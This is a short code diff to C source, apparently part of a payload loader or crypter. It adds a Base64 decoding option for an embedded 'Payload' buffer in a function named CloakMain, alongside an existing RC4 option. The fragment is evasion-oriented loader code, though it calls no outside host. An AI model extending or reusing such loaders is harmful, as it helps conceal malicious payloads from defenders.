@@ -92,6 +92,18 @@ int CloakMain(PVOID Reserved) {
     pbPayload = ( PBYTE* ) uPayload.Buffer;
     #endif // !RC4
 
+    #ifdef BASE64
+    pbPayload = ( PBYTE * ) DecodeBase64( ( LPCSTR ) Payload );
+
+    if ( pbPayload == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Failed to Decode Payload\n");
+        #endif // !DEBUG
+        
+        return 1;
+    }
+    #endif // !BASE64
+
     if ( pbPayload == NULL ) {
         pbPayload = ( PBYTE* ) &Payload;
     }
